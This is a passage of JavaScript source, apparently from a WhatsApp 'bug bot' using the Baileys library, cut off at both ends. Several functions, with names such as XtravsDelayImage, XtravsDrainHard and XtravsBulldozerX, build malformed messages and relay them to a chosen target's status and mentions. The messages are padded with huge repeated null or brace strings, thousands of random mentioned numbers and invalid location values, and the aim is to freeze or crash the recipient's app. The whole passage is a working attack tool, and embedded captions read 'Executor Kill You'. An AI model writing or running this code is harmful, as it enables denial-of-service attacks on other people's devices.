            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(99999),
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, stickerMsg, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error(err);
  }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function Protocolbug10(target, mention) {
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".XrL" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XrL" + "-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 600000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              X
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: tmsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function XtravsDelayImage(target, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_message",
            paramsJson: "\×10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "\u0000",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: target,
            mentionedJid: Array.from(
              { length: 1990 },
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            ),
            isSampled: true,
            remoteJid: "status@broadcast",
            forwardingScore: 100,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
          },
        },
      },
    },
  };
  
  const message3 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " 🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!! "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

let AllMentioned = [];
AllMentioned.push(
  Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
  ),
);

//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function protocolbug13(target, mention) {
  const mentionedJidList = [
    "6282140506078@s.whatsapp.net",
    ...Array.from({ length: 1990 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
    ),
  ];
  
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(20000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" + "-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionedJidList,
        annotations: [
          {
            embeddedContent: {
              X
            },
            embeddedAction: true
          }
        ]
      }
    }
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: mentionedJidList,
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const message3 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "XStrom-Flower Here Bro HAHAHAHA",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: target,
            mentionedJid: mentionedJidList,
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " 🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!! "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

//═══════════//═════════⧼⧼FUNGSI DELAY INVIS⧽⧽═════════//═══════════//
async function XtravsBetaXx(target, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const audioMessage2 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
           "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
         `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      }
    }
  };
  
  const msg = generateWAMessageFromContent(target, message1, audioMessage2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function VerloadSuperXx(target) {
for (let i = 0; i < 1; i++) {
    try {
      let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: '🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!',
                locationMessage: {
                  degreesLatitude: 999.99999990,
                  degreesLongitude: -99999999,
                  name: '{'.repeat(80000),
                  address: '{'.repeat(50000),
                },
                locationMessageV2: {
                  degreesLatitude: 250208,
                  degreesLongitude: -250208,
                  name: '{'.repeat(90000),
                  address: '{'.repeat(80000),
                },
              },
              body: {
                title: '',
              },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(80000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net",
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  )
                  ],
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveMessage: {
                        body: {
                          text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "galaxy_message",
                          paramsJson: "{".repeat(9000),
                          version: 3
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }, {});
      
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });
      
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
    });
  } catch (err) {
      console.log(err);
    }
  }
}

async function XtravsExeDelay(target, mention) {
  let message1 = {
    extendedTextMessage: {
      text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
      contextInfo: {
        participant: target,
        mentionedJid: AllMentioned,
        quotedMessage: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\×10",
                  version: 3,
                },
              },
            },
          },
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  
async function XtravsDrainHard(target, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\×10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  let message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
             ),
           ],
           forwardingScore: 100,
           isForwarded: true,
           forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function XtravsDelayAudio(target, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_message",
            paramsJson: "\×10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
           "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1990 }, () =>
         `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      }
    }
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function XtravsBulldozerX(target, mention) {
  const mentionedJidList = [ "0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  ];
  
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: mentionedJidList,
         quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            participant: target,
            mentionedJid: mentionedJidList,
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
